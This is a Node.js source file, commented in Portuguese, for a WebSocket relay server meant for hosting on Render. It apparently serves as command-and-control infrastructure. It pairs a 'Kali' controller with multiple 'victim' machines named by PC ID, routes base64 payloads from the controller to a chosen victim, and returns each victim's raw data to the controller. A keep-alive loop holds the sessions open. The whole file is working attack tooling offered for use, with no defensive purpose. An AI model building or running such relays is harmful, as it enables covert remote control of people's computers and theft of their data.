const WebSocket = require('ws');
const http = require('http');

// Cria o servidor HTTP para o Render
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end("Relay Status: Online");
});

const wss = new WebSocket.Server({ server });

// Gerenciamento de Conexões
let kali = null;
const victims = new Map();

wss.on('connection', (ws, req) => {
    // Extrai ID da vítima da URL: wss://.../victim?id=NOME_PC
    const urlParts = req.url.split('?');
    const path = urlParts[0].toLowerCase();
    const params = new URLSearchParams(urlParts[1]);
    const victimId = params.get('id') || `target_${Math.random().toString(36).substr(2, 5)}`;

    if (path.includes('kali')) {
        kali = ws;
        console.log(`[!] CONTROLADOR: Kali conectado.`);
    } else {
        victims.set(victimId, ws);
        console.log(`[+] ALVO: Conectado ID: ${victimId}`);
        
        // Notifica o Kali que uma nova vítima chegou
        if (kali && kali.readyState === WebSocket.OPEN) {
            kali.send(JSON.stringify({ event: "connection", id: victimId }));
        }
    }

    ws.on('message', (data) => {
        // Se a mensagem vem do Kali, roteia para a vítima específica
        if (ws === kali) {
            try {
                const msg = JSON.parse(data);
                const target = victims.get(msg.targetId);
                if (target && target.readyState === WebSocket.OPEN) {
                    // Envia apenas o payload binário para a vítima
                    target.send(Buffer.from(msg.payload, 'base64'));
                }
            } catch (e) { console.log("Erro no roteamento do Kali"); }
        } 
        // Se vem da vítima, manda para o Kali com o ID de origem
        else {
            if (kali && kali.readyState === WebSocket.OPEN) {
                // Encaminha os dados brutos da vítima para o Kali
                kali.send(JSON.stringify({ from: victimId, data: data.toString('base64') }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === kali) {
            kali = null;
            console.log("[-] CONTROLADOR: Kali desconectado.");
        } else {
            victims.delete(victimId);
            console.log(`[-] ALVO: Sessão [${victimId}] encerrada.`);
        }
    });

    ws.on('error', (err) => console.log(`Erro no Socket: ${err.message}`));
});

// Keep-Alive para evitar que o Render hiberne a conexão
setInterval(() => {
    wss.clients.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
    });
}, 20000);

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
